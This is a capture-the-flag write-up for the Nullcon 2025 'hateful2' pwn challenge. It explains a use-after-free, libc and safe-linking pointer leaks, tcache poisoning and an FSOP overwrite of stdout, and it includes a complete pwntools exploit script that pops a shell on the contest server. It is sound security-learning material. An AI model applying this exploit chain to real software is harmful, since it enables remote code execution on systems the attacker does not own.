series of 2, first one was fmt and easier which i covered it up [here](https://github.com/4rsp/writeups/tree/main/Nullcon-2025/hateful)

this one is about heap...

Full Relro, pie & canary... and a dream 😉

```C
undefined8 main(EVP_PKEY_CTX *param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  logo();
  puts("\nWelcome to our improved service edition HATEFUL2!\n");
  puts(
      "[+] After we have receives positive feedback of all our customers\nwe updated our service to make it even easier for you to use! (but also because we saw sus behaivors)"
      );
  puts("\nTo access our service now just use the MENU!");
  do {
    menu();
    iVar1 = __isoc99_scanf("%i%*c",&local_14);
    if (iVar1 == 0) {
      getchar();
    }
    switch(local_14) {
    case 0:
      about_us();
      break;
    case 1:
      add_message();
      break;
    case 2:
      edit_message();
      break;
    case 3:
      view_message();
      break;
    case 4:
      remove_message();
      break;
    case 5:
      puts("GoodBye!");
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    default:
      puts("Invalid Option my Friend. Try Again!\n");
    }
  } while( true );
}
```

my beloved heap menu. about_us function gives us a free stack leak, don't forget to take it before we move on :)
> i didn't use it tho..

remove_message function frees an allocated memory but doesn't zero out the pointer... which gives us a sweet UAF

first, fill the tcache to get an allocation in unsortedbin to leak a libc addr

and we also need to leak mangled ptr to perform tcache poisioning due to safe-linking (glibc 2.36)

a few words for safe-linking:

- tcache next pointers are mangled
- de-mangled pointer least significant nibble MUST be 0x0

~~which is why we can't just overwrite saved_rip of main...~~ (nvm.. it was my bad, people on discord have done it apparently)
> also there isn't just saved_rip of main, you know..
  
carefully allocate a chunk somewhere near stdout file structure and do FSOP

im not going into details about fsop attack, i explained it in [here](https://github.com/4rsp/docs/blob/main/practice.tool/file.structs/README.md) and used the same path

here's the code that does all that with friendly comments :)

```python3
#!/usr/bin/env python3

from pwn import *
import time

'''
p = gdb.debug("./hateful2_patched", gdbscript="""
              b *main+303
    c
""")
'''
p = remote("52.59.124.14", 5022)
#p = process("./hateful2_patched")

def demangle(ptr):
    mid = ptr ^ (ptr >> 12)
    return mid ^ (mid >> 24)

def mangle(ptr, pos):
    return (pos >> 12) ^ ptr

def malloc(idx, size, data):
    time.sleep(0.1)
    p.sendline(b"1")
    p.sendlineafter(b"Index: ", idx.encode('utf-8'))
    p.sendlineafter(b"Size: ", size.encode('utf-8'))
    p.sendlineafter(b">> ", data)
    
def free(idx):
    time.sleep(0.1)
    p.sendline(b"4")
    p.sendlineafter(b"Index: ", idx.encode('utf-8'))

def view(idx):
    p.sendline(b"3")
    p.sendlineafter(b"Index: ", idx.encode('utf-8'))
    p.recvuntil(b"Message: ")
    return p.recvline().strip()

def edit(idx, data):
    time.sleep(0.5)
    p.sendline(b"2")
    p.sendlineafter(b"Index: ", idx.encode('utf-8'))
    p.sendlineafter(b">> ", data)

# get the stack leak from option 0
p.sendline(b"0")
p.recvuntil(b"up to ")
stack_leak = int(p.recv(15))
print(f"stack leak: {hex(stack_leak)}")
rip = stack_leak + 0x14
print(f"saved_rip: {hex(rip)}")

# get an allocation on unsortedbin
# and leak the libc addr

for i in range(9):
    malloc(f"{i+4}", "240", b"")
    print(".")

for l in range(8):
    free(f"{l+4}")

libc_leak = u64(view("11").ljust(8, b"\x00"))
libc_base = libc_leak - 0x1d2cc0
stdout = libc_base + 0x1d3760
print(f"libc base: {hex(libc_base)}")
print(f"stdout: {hex(stdout)}")
system = libc_base + 0x4c490

# we will use this malloc to store our fake wide_data struct (idx 4)
# size should be big enough to hold the struct
malloc("4", "300", b"C"*8)

# leak mangled ptr 
malloc("0", "400", b"aaaa")
malloc("1", "400", b"bbbb")
free("1")
free("0")
leak = u64(view("0").ljust(8, b"\x00"))
print(f"mangled ptr: {hex(leak)}")
print(f"demangled ptr: {hex(demangle(leak))}")

# tcache poisoning
edit("0", p64(mangle(stdout-16, demangle(leak))))
malloc("3", "400", b"")

# needed addresses for FSOP 
lock = libc_base + 0x1d4a10
wfile = libc_base + 0x1cf0a0
malloc_addr = demangle(leak) - 0x340 + 96
jmp_to = wfile - 0x38 + 0x18
print(f"lock: {hex(lock)}")
print(f"wfile_jumps: {hex(wfile)}")
print(f"idx 4 malloc at: {hex(malloc_addr)}")

# file structure
payload = b"A"*16 # padding to stdout
payload += b" /bin/sh" # _flags + 4-byte hole
payload += b"\x00"*88 # *_IO_read_ptr -> *_IO_save_end
payload += b"\x00"*8 # *_markers
payload += b"\x00"*8 # *_chain
payload += b"\x00"*4 # _fileno
payload += b"\x00"*4 # _flags2
payload += b"\xff"*8 # _old_offset
payload += b"\x00"*2 # _cur_coloumn
payload += b"\x00"*1 # _vtable_offset
payload += b"\x01"*1 + p32(0x00) # _shortbuf[1] + 4-byte hole
payload += p64(lock) # *_lock
payload += b"\xff"*8 # _offset
payload += b"\x00"*8 # *_codecvt
payload += p64(malloc_addr) # *_wide_data
payload += b"\x00"*8 # *_freeres_list
payload += b"\x00"*8 # *_freeres_buf
payload += b"\x00"*8 # *__pad5
payload += b"\xff"*4 # _mode
payload += b"\x00"*20 # _unused2[20]
payload += p64(jmp_to) # VTABLE

# write fake wide_data struct to the malloc at idx 4
payload2 = p64(0x08) + p64(0x02) + b"a"*8 + p64(0x00) + p64(malloc_addr+112) + b"b"*8 + p64(0x00) + p64(system) + b"c"*160 + p64(malloc_addr-48)
edit("4", payload2)

# overwrite the file structure
# and enjoy your shell :p
malloc("3", "400", payload)

p.interactive()
```

FLAG: ```ENO{W3_4R3_50RRY_4G41N_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}```


***4rsp is learning to pwn things...***
